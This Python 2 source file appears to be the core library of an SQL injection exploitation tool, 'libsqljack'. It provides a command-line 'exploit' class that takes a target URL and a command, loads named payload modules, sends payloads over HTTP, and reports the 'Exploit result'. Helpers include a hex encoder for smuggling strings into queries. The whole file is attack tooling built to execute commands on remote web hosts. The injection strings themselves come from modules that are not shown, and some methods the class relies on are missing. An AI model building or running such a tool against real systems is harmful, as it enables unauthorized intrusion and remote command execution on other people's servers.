# -*- coding: utf-8 -*-
###
# STD modules
###
import os, logging, optparse, urllib, urllib2, random

LOG = logging.getLogger('libsqljack')

###
# sqljack
###
#import payloads

class exploit(object):

    def setup_logging(self):
        log2term = logging.StreamHandler()
        log2term.setFormatter(logging.Formatter('%(levelname)-8s %(name)-20s - %(message)s', datefmt='%d-%m-%y %H:%M:%S'))
        logging.root.addHandler(log2term)
        logging.root.setLevel(logging.DEBUG)
        self.log = logging.getLogger("exploit")

    def run(self):
        if len(self.args) < 2:
            self.log.error("No enough arguments. Aborting ...")
            return False
        self.log.info("Exploiting host: %s" % self.url)
        for payload in self.generate_payload():
            if not payload:
                break
            self.log.debug('Sending "%s" payload of %d bytes ...' % (payload.keys()[0], len(payload.values()[0])))
            if not payload:
                continue
            res = self.place_payload(payload)
            if not res:
                continue
            self.parse_result(self.result)
        out = self.get_output()
        self.log.info("Exploit result:\n%s" % out)

    def run_cli(self):
        self.setup_logging()
        self.opt = optparse.OptionParser(usage='%prog [options] <URL> <CMD>')
        self.opt.add_option('-p', '--payload', metavar="NAME",
            action='append', dest='payload',# default=False,
            help='Payload to use')
        self.opt.add_option('-v', '--verbosity',
            dest='verb', metavar="LEVEL", default=4,
            help='From 1 (quiet) to 5 (debug). Default: 4')
        self.opts, self.args = self.opt.parse_args()
        if not self.parse_args():
            return False
        self.run()

    def get_payload(self):
        if not self.opts.payload:
            #self.opts.payload = ['exec_via_file']
            self.opts.payload = ['default']
        name = "payload_%s" % self.opts.payload[0]
        module = __import__("payloads_%s" % self.EXPLOIT_TYPE)
        if hasattr(module, name):
            self.payload_module = getattr(module, name)(self.url)
            return True
        self.log.critical("No such payload: %s" % name)
        return False

    def parse_args(self):
        if len(self.args) < 2:
            self.opt.error("Too few arguments.")
            return False
        self.url = self.args[0]
        self.cmd = self.args[1]
        if not self.get_payload():
            self.log.error("Failed to build payload")
            return False
        try:
            lvl = 60 - (int(self.opts.verb) * 10)
        except Exception, e:
            lvl = logging.DEBUG
        logging.root.setLevel(lvl)
        return True

    def generate_payload(self):
        self.payload = self.payload_module.build_payload(self.cmd, *self.args[2:])
        return self.payload

    def parse_result(self, res):
        return self.payload_module.parse_result(res)

    def get_output(self):
        return self.payload_module.get_output()

###
# Misc functions
###
def send_web_request(url, data=None):
    if data:
        req = urllib2.Request(url, urllib.urlencode(data))
    else:
        req = urllib2.Request(url)
    err = False
    try:
        hdl = urllib2.urlopen(req)
        body = hdl.read()
    except urllib2.HTTPError, e:
        LOG.debug("HTTP Error: \n%s" % e)
        return ""
    return body

class payload_generic(object):

    def __init__(self, url):
        self.url = url
        name = self.__class__.__name__.split('_')
        self.log = logging.getLogger("_".join(name[1:]))
        super(payload_generic, self).__init__()

    def build_payload(self, cmd, *args):
        yield False

    def parse_result(self, result):
        return result

    def get_output(self):#, cmd, *args):
        return "No output"

def mkrandstr(size=8):
    return "rand%s" % str(random.randint(0, 999999))[:size]

def str2hex(s):
    return '0x' + ''.join([hex(ord(c))[2:].zfill(2) for c in s])
